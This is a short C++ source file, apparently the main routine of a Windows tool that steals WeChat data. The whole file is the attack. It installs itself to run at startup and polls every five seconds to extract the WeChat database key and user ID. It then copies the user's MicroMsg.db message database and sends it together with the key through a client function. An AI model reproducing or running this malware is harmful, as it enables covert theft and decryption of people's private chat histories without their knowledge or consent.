#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include "Getkey.h"
#include "Hack.h"

using namespace std;

unsigned char pass[33] = { 0 };
unsigned char filepath[256] = { 0 };
unsigned char wxid[256] = { 0 };

int main() {
	winStartUp();                      //开机自启

	while (1)                           //比较蠢的方法，每五秒检查一次窗口
	{
		if (GetdbKey(pass,wxid) == 1)
			break;
		printf("hello\n");
		Sleep(5000);            //获取密钥
	}

	unsigned char value[256] = { 0 };
	unsigned char cmd_command[256] = { 0 };
	getPath(value);             //获取数据库位置

	sprintf((char *)filepath, "%s\\WeChat Files\\%s\\Msg\\MicroMsg.db", value ,wxid);//这里是数据库的名字
	sprintf((char *)cmd_command, "copy \"%s\" MicroMsg.db /B", filepath); 
	printf("%s\n", cmd_command);
	system((const char *)cmd_command); //复制一份数据库到当前文件夹

	client(pass);             //发送数据库和密钥
	return 0;
}